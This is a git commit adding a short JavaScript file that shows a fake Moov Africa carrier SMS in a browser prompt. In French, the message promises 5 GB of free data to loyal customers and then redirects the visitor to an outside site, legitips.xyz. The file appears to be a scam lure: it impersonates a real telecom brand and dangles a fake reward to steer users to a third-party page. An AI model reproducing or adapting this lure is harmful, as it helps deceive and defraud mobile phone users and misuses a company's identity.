80ba0d3238bbf006c34e00faf2f37b34a2e5a346
legitips <83867893+legitips@users.noreply.github.com>
2024-08-30 15:05:41 -0700

    Create activation-moovafricafreedata.js

---
+++ activation-moovafricafreedata.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('MOOV AFRICA SMS: Cher client, veuillez vérifier si votre carte SIM MOOV AFRICA est éligible pour recevoir 5 Go de données illimitées, récompense pour les anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/moovafricafreedata.html';
+}
